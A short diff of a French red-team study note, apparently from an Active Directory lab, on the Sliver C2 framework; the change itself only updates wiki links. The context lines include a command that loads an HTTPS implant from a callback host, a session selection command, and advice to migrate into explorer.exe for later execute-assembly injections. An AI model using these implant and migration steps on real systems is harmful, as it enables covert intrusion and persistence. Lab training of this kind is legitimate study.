@@ -61,13 +61,13 @@ C:\AD\Tools\Sliver\BinLoader.exe 172.16.100.X 8080 dcorp-std_https.bin
 [server] sliver (dcorp-std_https) > use <new-session-id>
 ```
 
-Migrer vers un processus stable et durable (`explorer.exe`) donne une session résiliente et un bon parent pour les futures injections `execute-assembly`. Voir [[Sliver - Exécution et évasion]].
+Migrer vers un processus stable et durable (`explorer.exe`) donne une session résiliente et un bon parent pour les futures injections `execute-assembly`. Voir [[w. Sliver C2/Sliver - Exécution et évasion]].
 
 > [!note] Beacon vs session
 > Un **beacon** rappelle à intervalles (discret, asynchrone). Une **session** est interactive/temps réel (pratique mais plus bruyante). On passe de l'un à l'autre selon le besoin ; les commandes de tasking sont les mêmes.
 
 ## Related
-- [[Sliver - Exécution et évasion]]
+- [[w. Sliver C2/Sliver - Exécution et évasion]]
 - [[Workflow Sliver]]
 - [[Sliver - Toutes les commandes]]
 - [[Sliver - Index]]
